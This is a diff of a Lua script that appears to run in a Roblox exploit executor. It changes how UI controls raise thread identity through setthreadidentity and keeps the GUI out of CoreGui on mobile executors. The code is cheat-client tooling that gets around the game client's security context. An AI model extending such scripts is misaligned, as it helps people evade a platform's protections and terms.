@@ -2029,12 +2471,13 @@ end
 local function wrapControl(control)
     if type(control) ~= "table" or wrappedControls[control] then return control end
     wrappedControls[control] = true
+    local targetIdentity = CurrentExecutor.IsMobile and 7 or 8
     local function wrapTextMethod(methodName)
         local original = control[methodName]
         if type(original) == "function" then
             control[methodName] = function(self, value, ...)
                 local setIdentity = setthreadidentity or set_thread_identity
-                if type(setIdentity) == "function" then pcall(setIdentity, 8) end
+                if type(setIdentity) == "function" then pcall(setIdentity, targetIdentity) end
                 return original(self, localizeText(value), ...)
             end
         end
@@ -2049,7 +2492,7 @@ local function wrapControl(control)
             if type(callback) == "function" then
                 wrappedCb = function(...)
                     local setIdentity = setthreadidentity or set_thread_identity
-                    if type(setIdentity) == "function" then pcall(setIdentity, 8) end
+                    if type(setIdentity) == "function" then pcall(setIdentity, targetIdentity) end
                     return callback(...)
                 end
             end
@@ -4858,7 +5301,7 @@ local function safeParentScreenGui(gui)
         local ok, parent = pcall(gethui)
         if ok and parent and pcall(function() gui.Parent = parent end) then return true end
     end
-    if pcall(function() gui.Parent = CoreGui end) then return true end
+    if not CurrentExecutor.IsMobile and pcall(function() gui.Parent = CoreGui end) then return true end
     local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui", 5)
     return playerGui ~= nil and pcall(function() gui.Parent = playerGui end)
 end
